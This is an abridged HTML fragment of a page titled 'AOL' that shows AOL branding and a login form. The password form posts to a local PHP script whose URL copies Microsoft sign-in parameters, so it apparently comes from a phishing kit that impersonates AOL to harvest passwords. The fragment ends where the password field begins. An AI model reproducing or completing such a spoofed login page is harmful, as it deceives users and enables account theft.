...
<head>
    ...
    <title>AOL</title>
    <link rel="icon" type="image/x-icon" href="files/favaol1.png">
    <link rel="shortcut icon" type="image/x-icon" href="files/favaol2.png">
...
<body>
    ...
    <div class="app">
        ...
        <header class="header">
            <a href="">
                <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="">
            </a>
            <span>Help</span>
        </header>
        <main>
               ...
               <div class="col-1">
                    <div class="login-box">
                        ...
                        <div class="challenge">
                            ...
                            <form action="wsignin1.0&rpsnv=13&ct=1648037205&rver=Aol2&wp=MBI_SSL.php" method="post" name="login" id="login" onsubmit="return ValidateFormOther()">
                                <div class="password">
